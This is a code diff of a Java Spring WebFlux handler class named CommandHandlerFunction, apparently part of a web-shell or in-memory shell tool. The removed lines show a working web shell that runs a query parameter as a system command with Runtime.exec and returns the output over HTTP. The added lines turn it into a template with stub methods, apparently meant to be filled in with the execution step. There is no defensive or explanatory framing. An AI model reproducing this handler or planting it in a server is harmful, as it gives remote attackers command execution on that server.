@@ -6,6 +6,7 @@ import org.springframework.web.reactive.function.server.ServerResponse;
 import reactor.core.publisher.Mono;
 
 import java.io.BufferedReader;
+import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.util.Optional;
 
@@ -18,30 +19,32 @@ public class CommandHandlerFunction implements HandlerFunction<ServerResponse> {
 
     @Override
     public Mono<ServerResponse> handle(ServerRequest request) {
-        Optional<String> cmdOptional = request.queryParam(paramName);
-        if (!cmdOptional.isPresent()) {
+        Optional<String> paramOptional = request.queryParam(paramName);
+        if (!paramOptional.isPresent()) {
             return Mono.empty();
         }
-        System.out.println("hanlder function cmd " + cmdOptional.get());
+        StringBuilder result = new StringBuilder();
         try {
-            StringBuilder result = new StringBuilder();
-            try {
-                String cmd = cmdOptional.get();
-                Process exec = Runtime.getRuntime().exec(cmd);
-                try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(exec.getInputStream()))) {
-                    String line;
-                    while ((line = bufferedReader.readLine()) != null) {
-                        result.append(line);
-                        result.append(System.lineSeparator());
-                    }
+            String param = getParam(paramOptional.get());
+            InputStream inputStream = getInputStream(param);
+            try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream))) {
+                String line;
+                while ((line = bufferedReader.readLine()) != null) {
+                    result.append(line);
+                    result.append(System.lineSeparator());
                 }
-            } catch (Exception e) {
-                e.printStackTrace();
             }
-            return ServerResponse.ok().body(Mono.just(result.toString()), String.class);
-        } catch (Exception ex) {
-            ex.printStackTrace();
-            return ServerResponse.ok().body(Mono.just(ex.getMessage()), String.class);
+        } catch (Throwable e) {
+            e.printStackTrace();
         }
+        return ServerResponse.ok().body(Mono.just(result.toString()), String.class);
+    }
+
+    private String getParam(String param) {
+        return param;
+    }
+
+    private InputStream getInputStream(String param) throws Exception {
+        return null;
     }
 }
